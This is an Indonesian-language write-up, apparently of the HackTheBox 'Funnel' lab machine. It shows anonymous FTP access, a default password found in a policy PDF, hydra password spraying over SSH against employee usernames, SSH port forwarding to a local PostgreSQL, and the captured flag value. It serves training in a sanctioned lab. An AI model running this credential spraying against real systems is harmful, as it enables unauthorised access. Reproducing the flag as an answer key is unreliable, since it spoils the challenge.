---
title: "HackTheBox Starting Point: Funnel Walkthrough"
description: 'In this walkthrough, we will explore the HackTheBox Starting Point machine named "Funnel".'
date: 2025-02-18
tags: ["FTP","SSH Tunneling","Port Forwarding"]
image: '/public/static/htb-cover.jpg'
authors: ['chjwoo']
---

## Reconnaissance

Hal yang pertama kita lakukan adalah melakukan enumerate open port dan running service menggunakan tools nmap.

```bash
└─$ sudo nmap -sV -sC 10.129.123.95
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-18 20:34 WIB
Nmap scan report for 10.129.123.95
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.34
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.32 seconds

```

### FTP Login with Guest/Anonymous Account

Kita bisa login menggunakan guest account pada running service FTP.

```bash
└─$ ftp 10.129.123.95                            
Connected to 10.129.123.95.
220 (vsFTPd 3.0.3)
Name (10.129.123.95:w1thre): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||41745|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
226 Directory send OK.
ftp> cd mail_backup
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||19830|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp         58899 Nov 28  2022 password_policy.pdf
-rw-r--r--    1 ftp      ftp           713 Nov 28  2022 welcome_28112022
226 Directory send OK.
ftp> get password_policy.pdf
local: password_policy.pdf remote: password_policy.pdf
229 Entering Extended Passive Mode (|||11827|)
150 Opening BINARY mode data connection for password_policy.pdf (58899 bytes).
100% |**********************************************************| 58899      111.04 KiB/s    00:00 ETA
226 Transfer complete.
58899 bytes received in 00:00 (74.20 KiB/s)
ftp> get welcome_28112022
local: welcome_28112022 remote: welcome_28112022
229 Entering Extended Passive Mode (|||62465|)
150 Opening BINARY mode data connection for welcome_28112022 (713 bytes).
100% |**********************************************************|   713      566.08 KiB/s    00:00 ETA
226 Transfer complete.
713 bytes received in 00:00 (2.68 KiB/s)
ftp> 
```

Disini terdapat 2 file password_policy.pdf dan welcome_28112022. Pada file password policy terdapat default password untuk user baru yang harus diganti secepatnya. Password default-nya yaitu : funnel123#!#

![image.png](image.png)

Pada pesan welcome_28112022 terdapat semacam mail dan isinya bisa kita lihat semacam welcoming message. Selain itu juga terdapat list penerima yang bisa kita coba untuk melakukan login ke SSH dengan default password.

```bash
└─$ cat welcome_28112022 
Frome: root@funnel.htb
To: optimus@funnel.htb albert@funnel.htb andreas@funnel.htb christine@funnel.htb maria@funnel.htb
Subject:Welcome to the team!

Hello everyone,
We would like to welcome you to our team. 
We think you’ll be a great asset to the "Funnel" team and want to make sure you get settled in as smoothly as possible.
We have set up your accounts that you will need to access our internal infrastracture. Please, read through the attached password policy with extreme care.
All the steps mentioned there should be completed as soon as possible. If you have any questions or concerns feel free to reach directly to your manager. 
We hope that you will have an amazing time with us,
The funnel team. 

```

## Foothold

Kita bisa menggunakan tools hydra untuk melakukan password spraying (default password) terhadap list user yang ada di pesan welcome tersebut. Buat list user yang akan kita jadikan target untuk melakukan koneksi SSH.

```bash
└─$ cat usernames.txt   
optimus
albert
andreas
christine
maria  
```

```bash
└─$ hydra -L usernames.txt -p 'funnel123#!#' 10.129.123.95 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-18 20:56:50
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:5/p:1), ~1 try per task
[DATA] attacking ssh://10.129.123.95:22/
[22][ssh] host: 10.129.123.95   login: christine   password: funnel123#!#
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-18 20:56:57

```

Setelah mencoba hydra untuk melakukan login SSH dengan password default, ternyata user christine belum mengganti password default akunnya.

```bash
└─$ ssh christine@10.129.123.95
christine@10.129.123.95's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 18 Feb 2025 01:46:05 PM UTC

  System load:              0.0
  Usage of /:               61.4% of 4.78GB
  Memory usage:             12%
  Swap usage:               0%
  Processes:                159
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for ens160:  10.129.123.95
  IPv6 address for ens160:  dead:beef::250:56ff:fe94:684a

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

0 updates can be applied immediately.

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

christine@funnel:~$ 

```

Langkah selanjutnya kita bisa melakukan port-forwarding, tapi kita harus check terlebih dahulu service yang sedang running di local. Kita bisa menggunakan command ss (socket statistics) untuk melakukan check port yang listning secara lokal di mesin.

```bash
christine@funnel:~$ ss -tln
State              Recv-Q             Send-Q                         Local Address:Port                          Peer Address:Port             Process             
LISTEN             0                  4096                           127.0.0.53%lo:53                                 0.0.0.0:*                                    
LISTEN             0                  128                                  0.0.0.0:22                                 0.0.0.0:*                                    
LISTEN             0                  4096                               127.0.0.1:5432                               0.0.0.0:*                                    
LISTEN             0                  4096                               127.0.0.1:45529                              0.0.0.0:*                                    
LISTEN             0                  32                                         *:21                                       *:*                                    
LISTEN             0                  128                                     [::]:22                                    [::]:*    
```

Options Used

| -l | Display only listening sockets. |
| --- | --- |
| -t | Display TCP sockets. |
| -n | Do not try to resolve service names |

Berdasarkan scan diatas, kita dapat melihat beberapa port yang sedang listening secara lokal:

- Port 53 (DNS) - berjalan di loopback interface (127.0.0.53)
- Port 22 (SSH) - berjalan di semua interface (0.0.0.0)
- Port 5432 (PostgreSQL) - hanya berjalan di localhost (127.0.0.1)
- Port 45529 - service tidak diketahui, berjalan di localhost (127.0.0.1)
- Port 21 (FTP) - berjalan di semua interface (*)

```bash
christine@funnel:~$ ss -tl
State             Recv-Q            Send-Q                        Local Address:Port                               Peer Address:Port            Process            
LISTEN            0                 4096                          127.0.0.53%lo:domain                                  0.0.0.0:*                                  
LISTEN            0                 128                                 0.0.0.0:ssh                                     0.0.0.0:*                                  
LISTEN            0                 4096                              127.0.0.1:postgresql                              0.0.0.0:*                                  
LISTEN            0                 4096                              127.0.0.1:45529                                   0.0.0.0:*                                  
LISTEN            0                 32                                        *:ftp                                           *:*                                  
LISTEN            0                 128                                    [::]:ssh                                        [::]:*        
```

Yang menarik disini adalah port 5432 yang merupakan PostgreSQL database server yang hanya bisa diakses dari localhost. Kita bisa mencoba melakukan port forwarding untuk mengakses service tersebut dari mesin kita.

Untuk melakukan local port forwarding dengan SSH, kita bisa menggunakan perintah ssh dengan opsi -L, diikuti dengan port local, remote host dan port, serta server SSH remote. 

```bash
christine@funnel:~$ ssh -L 1234:localhost:5432 christine@10.129.123.95
The authenticity of host '10.129.123.95 (10.129.123.95)' can't be established.
ECDSA key fingerprint is SHA256:7+5qUqmyILv7QKrQXPArj5uYqJwwe7mpUbzD/7cl44E.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.123.95' (ECDSA) to the list of known hosts.
christine@10.129.123.95's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 18 Feb 2025 02:13:51 PM UTC

  System load:              0.01
  Usage of /:               63.2% of 4.78GB
  Memory usage:             13%
  Swap usage:               0%
  Processes:                162
  Users logged in:          1
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for ens160:  10.129.123.95
  IPv6 address for ens160:  dead:beef::250:56ff:fe94:684a

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

0 updates can be applied immediately.

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Feb 18 14:12:11 2025 from 10.10.14.34
christine@funnel:~$
```

Kita sudah berhasil melakukan port-forwarding, untuk mengeceknya kita bisa masukkan command berikut di local machine kita.

```bash
└─$ ss -tlpn                        
State           Recv-Q          Send-Q                   Local Address:Port                    Peer Address:Port          Process                                  
LISTEN          0               128                          127.0.0.1:1234                         0.0.0.0:*              users:(("ssh",pid=33925,fd=5))          
LISTEN          0               128                              [::1]:1234                            [::]:*              users:(("ssh",pid=33925,fd=4)) 
```

Sekarang kita bisa melakukan interaksi ke postgresql nya untuk mendapatkan flagnya.

```bash
└─$ psql -U christine -h localhost -p 1234
Password for user christine: 
psql (17.2 (Debian 17.2-1+b2), server 15.1 (Debian 15.1-1.pgdg110+1))
Type "help" for help.

christine=# \l
                                                      List of databases
   Name    |   Owner   | Encoding | Locale Provider |  Collate   |   Ctype    | Locale | ICU Rules |    Access privileges    
-----------+-----------+----------+-----------------+------------+------------+--------+-----------+-------------------------
 christine | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | 
 postgres  | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | 
 secrets   | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | 
 template0 | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | =c/christine           +
           |           |          |                 |            |            |        |           | christine=CTc/christine
 template1 | christine | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | =c/christine           +
           |           |          |                 |            |            |        |           | christine=CTc/christine
(5 rows)

christine=# \c secrets
psql (17.2 (Debian 17.2-1+b2), server 15.1 (Debian 15.1-1.pgdg110+1))
You are now connected to database "secrets" as user "christine".
secrets=# \dt
         List of relations
 Schema | Name | Type  |   Owner   
--------+------+-------+-----------
 public | flag | table | christine
(1 row)

secrets=# SELECT * from flag;
              value               
----------------------------------
 cf277664b1771217d7006acdea006db1
(1 row)

secrets=# 

```

## Flag

```bash
cf277664b1771217d7006acdea006db1
```